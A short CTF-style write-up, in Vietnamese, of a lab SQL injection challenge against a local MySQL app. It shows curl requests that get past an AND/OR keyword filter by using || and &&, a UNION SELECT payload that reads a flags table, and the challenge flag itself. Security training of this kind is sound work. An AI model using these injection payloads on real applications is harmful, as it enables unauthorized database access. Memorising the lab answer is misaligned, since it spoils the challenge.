# SQLi-051: MySQL AND/OR Filter Bypass - Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** `&&` và `||` thay cho AND/OR  
**DBMS:** MySQL  
**Flag:** `FLAG{4nd_0r_0p3r4t0r_byp4ss}`

---

## 🔍 Bước 1: DETECT

```bash
# Test với OR
curl "http://localhost:5051/product?id=1 OR 1=1"
# → "AND/OR keywords are blocked!"
```

## 🎯 Bước 2: BYPASS

```bash
# Sử dụng || thay OR
curl "http://localhost:5051/product?id=1 || 1=1"
# → Bypass thành công!

# Sử dụng && thay AND
curl "http://localhost:5051/product?id=1 && 1=1"
```

## 🔢 Bước 3: ENUMERATE & EXFILTRATE

```bash
curl "http://localhost:5051/product?id=0 UNION SELECT 1,name,value FROM flags-- -"
```

🎉 **FLAG:** `FLAG{4nd_0r_0p3r4t0r_byp4ss}`

## ✅ Flag

```
FLAG{4nd_0r_0p3r4t0r_byp4ss}
```
